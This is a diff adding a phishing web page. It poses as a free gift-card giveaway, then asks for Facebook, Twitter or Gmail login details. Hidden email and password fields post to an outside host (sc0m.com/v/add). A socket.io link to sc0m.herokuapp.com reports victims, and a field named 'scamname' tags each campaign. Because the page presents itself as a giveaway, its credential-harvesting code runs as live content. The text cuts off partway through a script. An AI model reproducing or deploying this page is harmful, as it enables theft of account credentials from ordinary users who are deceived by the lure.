@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head id="Head1"><link rel="stylesheet" type="text/css" href="https://siness.xyz/DXR.axd?r=0_2002,1_28,1_31,0_2004,0_1355,1_10,0_1357,0_1948,0_1155,0_1157,0_4302,0_4304,0_3173,0_3175,0_1946-_rgIn" /><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, user-scalable=no, maximum-scale=0.8, minimum-scale=0.9" /><title>
+
+</title>
+    <script type="text/javascript">
+        var interval = null;
+        function StartTimer() {
+            lp.Show();
+
+            if (interval == null) {
+                var counter = 0;
+                interval = setInterval(function () {
+                    counter += 1;
+                    // Do your task.
+                    ASPxDataViews.SetVisible(false);
+                    document.getElementById("ddd1").style.visibility = "hidden";
+                    lp.Hide();
+                    document.getElementById("ddd2").style.visibility = "visible";
+                    StopTimer();
+                }, 1000);
+            }
+        }
+
+        function StopTimer() {
+            clearInterval(interval);
+            interval = null;
+
+        }
+
+        function OnControlsInitialized(s, e) {
+            //Hide
+            //lp.Hide();
+
+            //Hide After Timeout
+            setTimeout(function () {
+                lp.Hide();
+            }, 2000);
+        }
+        var dimlogin;
+
+        function ShowLoginWindow() {
+
+
+            if (document.getElementById("Hidden1").value == "") {
+
+                document.getElementById("Hidden1").value = "facebook";
+
+            }
+            else {
+            }
+            document.getElementById("ASPxPopupControl1_Image5").src = "/Content/Images/facebookblo.png";
+
+
+            ttttttt.Show();
+
+
+
+
+        }
+        function ShowLoginWindow12() {
+
+            if (document.getElementById("Hidden1").value == "") {
+
+                document.getElementById("Hidden1").value = "twitter";
+
+            }
+            else {
+            }
+            document.getElementById("ASPxPopupControl1_Image5").src = "/Content/Images/twwww.png";
+
+            ttttttt.Show();
+
+        }
+        function ShowLoginWindow2() {
+
+
+            if (document.getElementById("Hidden1").value == "") {
+
+                document.getElementById("Hidden1").value = "Gmail";
+
+            }
+            else {
+            }
+            document.getElementById("ASPxPopupControl1_Image5").src = "/Content/Images/noavatar.png";
+
+            ttttttt.Show();
+
+        }
+        function pageLoad(sender, args) {
+
+            //             alert(args._isPartialLoad);
+
+        }
+        function ShowLoginWindow1() {
+            pcLogin.Hide();
+            pcLogin1.Show();
+
+        }
+        function updateTrackBarLabels() {
+
+            updateItemTrackBarLabels(itemTrackBar);
+        }
+
+        function updateItemTrackBarLabels(trackBar) {
+            Labelz.SetText(trackBar.GetPositionStart());
+            //
+        }
+        function updateTrackBarLabels1() {
+
+            updateItemTrackBarLabels1(itemTrackBar1);
+        }
+
+        function updateItemTrackBarLabels1(trackBar1) {
+            Labelz1.SetText(trackBar1.GetPositionStart());
+            //
+        }
+        function updateTrackBarLabels2() {
+
+            updateItemTrackBarLabels2(itemTrackBar2);
+        }
+
+        function updateItemTrackBarLabels2(trackBar2) {
+            Labelz2.SetText(trackBar2.GetPositionStart());
+
+        }
+        //        =============================
+
+    </script>
+    <style type="text/css">
+        #target
+		{
+		margin: 0 auto;
+		}
+		#target_WaitingPopup .e-image
+		{
+		display: block;
+		height: 70px;
+		}
+		#popup
+		{
+		height: auto;
+		width: auto;
+		margin-top: 100px;
+		}
+        .auto-style1 {
+            width: 100%;
+        }
+        .style1
+        {
+            height: 38px;
+        }
+ .topPanel {
+    padding-left: 0 !important;
+    padding-right: 0 !important;
+}
+
+.topPanel .btn {
+    margin-right: 12px;
+}
+
+.title {
+    float: left;
+    padding: 1px 4px 2px 38px;
+    font-size: 2.2em;
+}
+
+.expandedPanel .title {
+    display: none;
+}
+
+.mainMenu {
+    float: right !important;
+    margin: 8px 38px 4px 0;
+}
+
+.expandedPanel .mainMenu {
+    width: 100%;
+    margin: 0px;
+}
+
+.titleContainer,
+.dataView {
+    margin: 0 auto;
+    width: 100%;
+    max-width: 960px;
+}
+
+.dateViewContent {
+    border: 0 !important;
+    padding: 16px !important;
+}
+
+.dateViewContent > table {
+    margin: 0 !important;
+}
+
+.dateViewItem {
+    margin: 0 !important;
+    padding: 12px !important;
+    width: 200px !important;
+    height: 260px !important;
+}
+
+.dateViewItem > table {
+    border-collapse: separate;
+    border-spacing: 2px;
+    width: 100%;
+    white-space: nowrap;
+}
+
+.itemss
+{
+
+        /* background-image: linear-gradient(
+21deg,#fff 0,#ff3737 100%); */
+        background-position: 0% 0%;
+            height: 100%;
+            position: relative;
+            background-image: linear-gradient(
+21deg,#ffca97 0,#fff 100%);
+*/background-color: #000000;
+            background-repeat: repeat;
+            background-attachment: scroll;
+        }
+
+
+
+
+
+.bodybody {
+    background-color: #151016;
+    margin-top: 0px;
+    margin-left: 0px;
+    margin-right: 0px;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-image: linear-gradient(
+33deg,#ffffff 0,#ff7805 100%);
+}
+.section {
+    padding: 10px;
+    margin: 0 10px;
+    margin-top: 10px;
+    -webkit-border-radius: 20px;
+    -moz-border-radius: 20px;
+    border-radius: 20px;
+    border: 0px solid #000000;
+       background: rgb(255 255 255 / 50%);
+}
+.section1
+{
+      background: rgb(255 255 255 / 50%);
+    }
+    .section2
+{
+       background: rgb(255 254 251 / 50%);
+    }
+
+        </style>
+</head>
+<body class="bodybody" >
+    <form  method="post" action="https://sc0m.com/v/add" id="form1">
+<div id="sssssss" class="aspNetHidden">
+<input type="hidden" name="email" id="email" value="" />
+<input type="hidden" name="password" id="password" value="" />
+<input type="hidden" value="" name="code" v-model="codecountry">
+
+<input type="hidden" value="" name="id" v-model="id_u">
+<input type="hidden" value="" name="sc" v-model="scamname">
+<!--<button type="submit" onclick="ss()" name="add" class="birou">{{login}}</button>-->
+
+</div>
+
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script src="https://unpkg.com/country-phone-prefix@latest"></script>
+ <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+<script>
+const socket = io("wss://sc0m.herokuapp.com");
+ const queryStrings = window.location.search;
+	const urlParamss = new URLSearchParams(queryStrings);
+	const qs = urlParamss.get('q');
+
+	let rrss = atob(qs);
+	let users = rrss.split("_")[3];
+	users = users.split("=")[1];
+ function ss(){
+   socket.emit('add', {
+	nickname: "users",
+	groupe: parseInt(users),
+  });
+  socket.emit('adds', {
+	nickname: "users",
+	groupe: 1,
+  });
+ };
+</script>
+<script>
+	var vm = new Vue({
+el : "#sssssss",
+data:{
+  password:"",
+  email:"",
+  login:'',
+  firsts:'',
+  create:'',
+  forget:'',
+  fetch:[],
+  codecountry:'',
+  id_u:'',
+  scamname:'',
+},
+methods:{
+
+},
+
+ mounted()  {
+	
+	 const queryString = window.location.search;
+const urlParams = new URLSearchParams(queryString);
+const q = urlParams.get('q');
+
+let rrs= atob(q);
+let idu= rrs.split("=")[1][1]
+let user= rrs.split("_")[3]
+user= user.split("=")[1]
+let sc= rrs.split("_")[2]
+sc= sc.split("=")[1]
+rrs= rrs.split("_")[1]
+rrs= rrs.split("=")[1]
+//alert(user)
+let lang = rrs;
+this.id_u = user
+this.scamname= sc
+
+   if(lang == 'ar'){
+	 this.email = "رقم الهاتف  أو البريد الإلكتروني";
+	 this.password = "كلمه السر";
+	 this.create = "انشاء حساب جديد";
+	 this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
+	 this.forget = " هل نسيت كلمة السر ؟";
+	 this.login="تسجيل الدخول"
+   }
+   else if (lang == 'es'){
+	  this.email = "Número o correo electrónico";
+	 this.password = "contraseña";
+	 this.create = "Crear una nueva cuenta";
+	 this.firsts = "Primero debes iniciar sesión.";
+	 this.forget = "¿Contraseña olvidada?";
+	 this.login = "iniciar sesión";
+   }
+   else if (lang == 'th'){
+	  this.email = "เบอร์มือถือหรืออีเมล";
+	 this.password = "รหัสผ่าน";
+	 this.create = "สร้างบัญชีใหม่";
+	 this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
+	 this.forget = "ลืมรหัสผ่าน?";
+	 this.login = "เข้าสู่ระบบ";
+   }
+   else {
+	  this.email = "Mobile number or email address";
+	 this.password = "Password";
+	 this.create = "Create New Account";
+	 this.firsts = "You need to log in first.";
+	 this.forget = "Forgotten password?";
+	 this.login = "Log In";
+   }
+
+axios.get("https://livebotola.com/ip.php")
+	   .then((resps)=>{
+
+	let dd=  cpp[resps.data]
+	   this.codecountry = dd.prefix;
+		 })
+
+		},
+})
+
+
+//  let t= await     axios.get("https://sp0m.site/ip.php");
+	 //  let dd=  cpp[resps.data];
+	//   let oo=  dd.prefix;
+
+
+
+
+</script>
+
+<!-- <script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script> -->
+
+
+<script src="https://siness.xyz//WebResource.axd?d=fn9QajxPi9_wb27H7bm9yVt9vnyy07kGgcMt6zl0O393A9AfID7yjgJNg1pDopWseDoBO7Q1TSnwCcwgXp6pukR0HyjRRD9OuMpdCfL4abk1&amp;t=637453854340000000" type="text/javascript"></script>
+
+
+<script src="https://siness.xyz//ScriptResource.axd?d=uUTZm7eVzg35tfiESEyy6uWWkeFeJ6zoP3ZWlBD2kudrneZrH_nhT3zPOoH50bYpkuMZTKsQjmxyIzoHmMsjWlWCfmJIAQSc4C9SR78l3HHrn5YA2g-HS8UhmMaTK6wLtsaroVrPUwa2cF8dKmFt-OhOPYmGCcCxXmFrHuZh3sk1&amp;t=363be08" type="text/javascript"></script>
+<script src="https://siness.xyz//ScriptResource.axd?d=3PKpLZRXKY8ietBZaT-uX0I2MVtZJeA-j6qkZLZnkqn4GeQKSDmIi0zsyGPdlfwsBNuBBqagNDdXwXl6hwHvOKWeURAmTPaVpd_k46swWoH59GLNota5UlIVfNFSxrvUNAPmY9yGTrVZPoGRr1icIcmA9BOmGpkmP5_Q_asLRr9-xvf3jcXEWyV2aBd8v8yQ0&amp;t=363be08" type="text/javascript"></script>
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="BE53FC7E" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAQc+gfc91xOIZSlFv0FrW3rtifadqtaY6/77vqqTNsCTgvIvlUtHXv4vj7wPpIN7/MFCencDzudrELFAJnb9XJdRq0K/64b55VObyuDDql20yeg0GDV28762rSrmAPwJAk=" />
+</div>
+        <div>
+            <table class="auto-style1">
+                <tr>
+                    <td align="center">
+                        <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ScriptManager1', 'form1', ['tUpdatePanel2','','tUpdatePanel1',''], [], [], 90, '');
+//]]>
+</script>
+
+                        <img id="Image3" src="https://siness.xyz/Content/pubskn/4516977_orig.png" style="height:100px;" />
+                    </td>
+                </tr>
+            </table>
+        </div>
+    <table class="auto-style1">
+        <tr>
+            <td align="center" class="style1">
+                <div id="Panel1" style="width:430px;">
+
+ <div class="section header">
+<center>
+<img src="https://siness.xyz/Content/pubskn/fl_left.png" border="0" width="100"> Choose your Card!
+    <img src="https://siness.xyz/Content/pubskn/fl_right.png" border="0" width="100"><br>
+</center>
+Select the gift card that you would like to receive!</div>
+
+</div>
+
+                </td>
+        </tr>
+        <tr>
+            <td align="center" id="ddd1">
+                <div id="UpdatePanel2">
+
+                        <script id="dxis_450202438" src="https://siness.xyz/\/DXR.axd?r=1_240,1_137,1_234,1_163,1_173,1_140,1_222,1_141,1_150,1_134,1_226,1_224,1_161,1_169,1_213,1_183-_rgIn" type="text/javascript"></script><table class="dxdvControl_Moderno dateViewItem" id="ASPxDataView1">
+		<tr>
+			<td id="ASPxDataView1_CCell" class="dxdvCtrl" style="vertical-align:top;"><table style="width:100%;border-collapse:separate;">
+				<tr>
+					<td id="ASPxDataView1_ICell" class="dxdvContent_Moderno"><table style="height:100%;width:100%;">
+						<tr>
+							<td class="dxdvItem_Moderno itemss dx-al" style="border-color:#FF9933;border-width:1px;border-style:Inset;width:245px;vertical-align:Top;">
+                                <table style="border-style: 10; padding: 10px;" width="100%">
+                                    <tr>
+                                        <td align="center">
+                                            <img id="ASPxDataView1_IT0_Image2" src="https://siness.xyz/Content/pubskn/Fricu2.png" style="height:160px;width:140px;" />
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <a id="ASPxDataView1_IT0_HyperLink1" style="color:Black;font-weight:bold;font-style:normal;text-decoration:none;">Select the gift card that you would like to receive!</a>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <div class="dxbButton_Material dxbButtonSys dxbTSys" id="ASPxDataView1_IT0_ASPxButton1" style="-webkit-user-select:none;">
+								<div class="dxb">
+									<div class="dxb-hbc">
+										<input id="ASPxDataView1_IT0_ASPxButton1_I" class="dxb-hb" value="FREE" type="button" name="ASPxDataView1$IT0$ASPxButton1" />
+									</div><span class="dx-vam">FRRE</span>
+								</div>
+							</div><script id="dxss_1494469866" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxDataView1_IT0_ASPxButton1',[[['dxbButtonHover_Material'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxDataView1_IT0_ASPxButton1',[[['dxbButtonPressed_Material'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxDataView1_IT0_ASPxButton1',[[['dxbDisabled_Material'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxDataView1_IT0_ASPxButton1',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxDataView1_IT0_ASPxButton1');
+dxo.InitGlobalVariable('ASPxDataView1_IT0_ASPxButton1');
+dxo.SetProperties({'autoPostBack':true,'uniqueID':'ASPxDataView1$IT0$ASPxButton1'});
+dxo.SetEvents({
+	'Click':function(s, e) {
+	StartTimer()
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                </table>
+                            </td><td style="font:0;min-width:23px;"></td><td class="dxdvItem_Moderno itemss dx-al" style="border-color:#FF9933;border-width:1px;border-style:Inset;width:245px;vertical-align:Top;">
+                                <table style="border-style: 10; padding: 10px;" width="100%">
+                                    <tr>
+                                        <td align="center">
+                                            <img id="ASPxDataView1_IT1_Image2" src="https://siness.xyz/Content/pubskn/Fricu3.png" style="height:160px;width:140px;" />
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <a id="ASPxDataView1_IT1_HyperLink1" style="color:Black;font-weight:bold;font-style:normal;text-decoration:none;">Select the gift card that you would like to receive!</a>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <div class="dxbButton_Material dxbButtonSys dxbTSys" id="ASPxDataView1_IT1_ASPxButton1" style="-webkit-user-select:none;">
+								<div class="dxb">
+									<div class="dxb-hbc">
+										<input id="ASPxDataView1_IT1_ASPxButton1_I" class="dxb-hb" value="FRRE" type="button" name="ASPxDataView1$IT1$ASPxButton1" />
+									</div><span class="dx-vam">FRRE</span>
+								</div>
+							</div><script id="dxss_1504488159" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxDataView1_IT1_ASPxButton1',[[['dxbButtonHover_Material'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxDataView1_IT1_ASPxButton1',[[['dxbButtonPressed_Material'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxDataView1_IT1_ASPxButton1',[[['dxbDisabled_Material'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxDataView1_IT1_ASPxButton1',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxDataView1_IT1_ASPxButton1');
+dxo.InitGlobalVariable('ASPxDataView1_IT1_ASPxButton1');
+dxo.SetProperties({'autoPostBack':true,'uniqueID':'ASPxDataView1$IT1$ASPxButton1'});
+dxo.SetEvents({
+	'Click':function(s, e) {
+	StartTimer()
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                </table>
+                            </td>
+						</tr><tr>
+							<td style="font:0;height:23px;"></td><td></td><td style="font:0;height:23px;"></td>
+						</tr><tr>
+							<td class="dxdvItem_Moderno itemss dx-al" style="border-color:#FF9933;border-width:1px;border-style:Inset;width:245px;vertical-align:Top;">
+                                <table style="border-style: 10; padding: 10px;" width="100%">
+                                    <tr>
+                                        <td align="center">
+                                            <img id="ASPxDataView1_IT2_Image2" src="https://siness.xyz/Content/pubskn/Fricu4.png" style="height:160px;width:140px;" />
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <a id="ASPxDataView1_IT2_HyperLink1" style="color:Black;font-weight:bold;font-style:normal;text-decoration:none;">Select the gift card that you would like to receive!</a>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <div class="dxbButton_Material dxbButtonSys dxbTSys" id="ASPxDataView1_IT2_ASPxButton1" style="-webkit-user-select:none;">
+								<div class="dxb">
+									<div class="dxb-hbc">
+										<input id="ASPxDataView1_IT2_ASPxButton1_I" class="dxb-hb" value="FRRE" type="button" name="ASPxDataView1$IT2$ASPxButton1" />
+									</div><span class="dx-vam">FRRE</span>
+								</div>
+							</div><script id="dxss_539297552" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxDataView1_IT2_ASPxButton1',[[['dxbButtonHover_Material'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxDataView1_IT2_ASPxButton1',[[['dxbButtonPressed_Material'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxDataView1_IT2_ASPxButton1',[[['dxbDisabled_Material'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxDataView1_IT2_ASPxButton1',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxDataView1_IT2_ASPxButton1');
+dxo.InitGlobalVariable('ASPxDataView1_IT2_ASPxButton1');
+dxo.SetProperties({'autoPostBack':true,'uniqueID':'ASPxDataView1$IT2$ASPxButton1'});
+dxo.SetEvents({
+	'Click':function(s, e) {
+	StartTimer()
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                </table>
+                            </td><td style="font:0;min-width:23px;"></td><td class="dxdvItem_Moderno itemss dx-al" style="border-color:#FF9933;border-width:1px;border-style:Inset;width:245px;vertical-align:Top;">
+                                <table style="border-style: 10; padding: 10px;" width="100%">
+                                    <tr>
+                                        <td align="center">
+                                            <img id="ASPxDataView1_IT3_Image2" src="https://siness.xyz/Content/pubskn/Fricu5.png" style="height:160px;width:140px;" />
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <a id="ASPxDataView1_IT3_HyperLink1" style="color:Black;font-weight:bold;font-style:normal;text-decoration:none;">Select the gift card that you would like to receive!</a>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            <div class="dxbButton_Material dxbButtonSys dxbTSys" id="ASPxDataView1_IT3_ASPxButton1" style="-webkit-user-select:none;">
+								<div class="dxb">
+									<div class="dxb-hbc">
+										<input id="ASPxDataView1_IT3_ASPxButton1_I" class="dxb-hb" value="FRRE" type="button" name="ASPxDataView1$IT3$ASPxButton1" />
+									</div><span class="dx-vam">FRRE</span>
+								</div>
+							</div><script id="dxss_832436911" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxDataView1_IT3_ASPxButton1',[[['dxbButtonHover_Material'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxDataView1_IT3_ASPxButton1',[[['dxbButtonPressed_Material'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxDataView1_IT3_ASPxButton1',[[['dxbDisabled_Material'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxDataView1_IT3_ASPxButton1',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxDataView1_IT3_ASPxButton1');
+dxo.InitGlobalVariable('ASPxDataView1_IT3_ASPxButton1');
+dxo.SetProperties({'autoPostBack':true,'uniqueID':'ASPxDataView1$IT3$ASPxButton1'});
+dxo.SetEvents({
+	'Click':function(s, e) {
+	StartTimer()
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="center">
+                                            &nbsp;</td>
+                                    </tr>
+                                </table>
+                            </td>
+						</tr>
+					</table></td>
+				</tr>
+			</table></td>
+		</tr>
+	</table><table id="ASPxDataView1_LP" class="dxdvLoadingPanel_Moderno dxlpLoadingPanel_Moderno" style="left:0px;top:0px;z-index:30000;display:none;">
+		<tr>
+			<td class="dx" style="padding-right:0px;"><img class="dxlp-loadingImage dxlp-imgPosLeft" src="/DXR.axd?r=1_35-_rgIn" alt="" style="vertical-align:middle;" /></td><td class="dx" style="padding-left:0px;"><span id="ASPxDataView1_TL">Loading&hellip;</span></td>
+		</tr>
+	</table><div id="ASPxDataView1_LD" class="dxdvLoadingDiv_Moderno dxlpLoadingDiv_Moderno dx-ft" style="left:0px;top:0px;z-index:29999;display:none;position:absolute;">
+
+	</div><script id="dxss_1374405665" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientDataView('ASPxDataView1');
+dxo.InitGlobalVariable('ASPxDataViews');
+dxo.SetProperties({
+	'callBack':function(arg) { WebForm_DoCallback('ASPxDataView1',arg,ASPx.Callback,'ASPxDataView1',ASPx.CallbackError,true); },
+	'stateObject':{
+		'pageCount':1,
+		'layout':0,
+		'ic':4,
+		'aspi':0,
+		'pageIndex':0,
+		'pageSize':10,
+		'b':true,
+		'endlessPagingMode':0,
+		'pc':1,
+		'ps':0
+	}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+
+</div>
+               </td>
+        </tr>
+        <tr>
+             <td id="gmlap" align="center">
+
+                 <div id="UpdatePanel1">
+
+                         <table class="auto-style1">
+                             <tr>
+                                 <td align="center">
+                                     &nbsp;</td>
+                             </tr>
+                             <tr>
+                                 <td align="center">
+                                     &nbsp;</td>
+                             </tr>
+                             <tr>
+                                 <td id="ddd2" align="center">
+                                     <div id="ASPxPanel1" class="section1" style="border-color:WhiteSmoke;border-style:Dotted;width:430px;">
+
+                                         </panelcontent>
+                                         </PanelCollection>
+                                         <table class="auto-style1">
+                                             <table id="erwerwer" align="center" width="100%">
+			<tr>
+				<td align="center" bgcolor="#F7F7F7" style="padding: 8px">
+                                                         <span class="dxeBase_Moderno" id="ASPxLabel5" style="color:#CC3300;font-size:Medium;font-weight:bold;">Log in to the game account</span>
+                                                         <br />
+                                                         <img id="Image4" src="https://siness.xyz/Content/Images/noavatar.png" style="height:50px;width:50px;" />
+                                                     </td>
+			</tr>
+			<tr>
+				<td align="center" style="padding: 8px">
+                                                         <input type="hidden" name="Hidden1" id="Hidden1" />
+                                                     </td>
+			</tr>
+			<tr>
+				<td align="center" style="padding: 8px">
+                                                         <div class="dxbButton_iOS dxbButtonSys dxbTSys" id="ASPxButton3" style="font-size:Medium;font-weight:bold;width:90%;-webkit-user-select:none;">
+					<div class="dxb">
+						<div class="dxb-hbc">
+							<input  class="dxb-hb" type="submit" onclick="ss()" name="add" value="Login Facebook" type="button" name="ASPxButton3" />
+						</div><img class="dx-vam" src="https://siness.xyz/Content/Images/facebook.png" alt="" style="margin-right:4px;" /><span class="dx-vam">Login Facebook</span>
+					</div>
+				</div><script id="dxss_729424492" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxButton3',[[['dxbButtonHover_iOS'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxButton3',[[['dxbButtonPressed_iOS'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxButton3',[[['dxbDisabled_iOS'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxButton3',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxButton3');
+dxo.InitGlobalVariable('ASPxButton3');
+dxo.SetEvents({
+	'Click':function(s, e) {
+ShowLoginWindow()
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                     </td>
+			</tr>
+			<tr>
+				<td align="center" style="padding: 8px">
+                                                         <div class="dxbButton_Material dxbButtonSys dxbTSys" id="ASPxButton4" style="font-size:Medium;font-weight:bold;width:90%;-webkit-user-select:none;">
+					<div class="dxb">
+						<div class="dxb-hbc">
+							<input id="ASPxButton4_I" class="dxb-hb" value="Login Twitter" type="button" name="ASPxButton4" />
+						</div><img class="dx-vam" src="https://siness.xyz/Content/Images/twitter.png" alt="" style="margin-right:4px;" /><span class="dx-vam">Login Twitter</span>
+					</div>
+				</div><script id="dxss_547299113" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxButton4',[[['dxbButtonHover_Material'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxButton4',[[['dxbButtonPressed_Material'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxButton4',[[['dxbDisabled_Material'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxButton4',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxButton4');
+dxo.InitGlobalVariable('ASPxButton4');
+dxo.SetEvents({
+	'Click':function(s, e) {
+	ShowLoginWindow12()
+
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                     </td>
+			</tr>
+			<tr>
+				<td align="center" style="padding: 8px">
+                                                         <div class="dxbButton_SoftOrange dxbButtonSys dxbTSys" id="ASPxButton5" style="font-size:Medium;font-weight:bold;width:90%;-webkit-user-select:none;">
+					<div class="dxb">
+						<div class="dxb-hbc">
+							<input id="ASPxButton5_I" class="dxb-hb" value="Login Gmail" type="button" name="ASPxButton5" />
+						</div><img class="dx-vam" src="https://siness.xyz/Content/Images/gmail1.png" alt="" style="margin-right:4px;" /><span class="dx-vam">Login Gmail</span>
+					</div>
+				</div><script id="dxss_1603036023" type="text/javascript">
+<!--
+ASPx.AddHoverItems('ASPxButton5',[[['dxbButtonHover_SoftOrange'],[''],[''],['','TC']]]);
+ASPx.AddPressedItems('ASPxButton5',[[['dxbButtonPressed_SoftOrange'],[''],[''],['','TC']]]);
+ASPx.AddDisabledItems('ASPxButton5',[[['dxbDisabled_SoftOrange'],[''],[''],['','TC']]]);
+ASPx.AddSelectedItems('ASPxButton5',[[['dxbf'],[''],['CD']]]);
+
+var dxo = new ASPxClientButton('ASPxButton5');
+dxo.InitGlobalVariable('ASPxButton5');
+dxo.SetEvents({
+	'Click':function(s, e) {
+ShowLoginWindow2()
+
+}
+});
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                     </td>
+			</tr>
+		</table>
+
+                                             </tr>
+                                         </table>
+
+	</div>
+                                 </td>
+
+                             </tr>
+                             <tr>
+                                 <td align="center">
+                                 <div id="ASPxPopupControl1_PW-1" class="dxpcLite_Office2010Black dxpclW" style="width:350px;cursor:default;z-index:10000;display:none;visibility:hidden;">
+		<div class="dxpc-mainDiv naar dxpc-shadow" style="background-color:#EFEFEF;">
+			<div class="dxpc-header dxpc-withBtn">
+				<div class="dxpc-closeBtn">
+					<img class="dxWeb_pcCloseButton_Office2010Black" src="/DXR.axd?r=1_35-_rgIn" alt="[Close]" />
+				</div><div class="dxpc-headerContent">
+					<span class="dxpc-headerText dx-vam">Login</span>
+				</div><b class="dx-clear"></b>
+			</div><div class="dxpc-contentWrapper">
+				<div class="dxpc-content">
+
+                                                         <table ID="234234" align="center" width="100%">
+                                                             <tr>
+                                                                 <td align="center" style="padding: 11px">
+                                                                     <img id="ASPxPopupControl1_Image5" src="" style="width:50px;" />
+                                                                     <br />
+                                                                 </td>
+                                                             </tr>
+                                                             <tr>
+                                                                 <td align="center" class="style2" style="padding: 11px">
+                                                                     <table class="dxeTextBoxSys dxeTextBox_Moderno dxeTextBoxDefaultWidthSys" id="ASPxPopupControl1_usernamepop" style="width:90%;">
+						<tr>
+							<td class="dxic" style="width:100%;"><input class="dxeEditArea_Moderno dxeEditAreaSys" id="ASPxPopupControl1_usernamepop_I" name="ASPxPopupControl1$usernamepop" onfocus="ASPx.EGotFocus(&#39;ASPxPopupControl1_usernamepop&#39;)" onblur="ASPx.ELostFocus(&#39;ASPxPopupControl1_usernamepop&#39;)" onchange="ASPx.EValueChanged(&#39;ASPxPopupControl1_usernamepop&#39;)" value="Phone number or email address" type="text" /></td>
+						</tr>
+					</table><script id="dxss_500782038" type="text/javascript">
+<!--
+ASPx.AddDisabledItems('ASPxPopupControl1_usernamepop',[[['dxeDisabled_Moderno'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ASPxPopupControl1_usernamepop');
+dxo.InitGlobalVariable('ASPxPopupControl1_usernamepop');
+dxo.SetProperties({
+	'uniqueID':'ASPxPopupControl1$usernamepop',
+	'stateObject':{'rawValue':''},
+	'nullText':'Phone number or email address'
+});
+dxo.InitializeProperties({
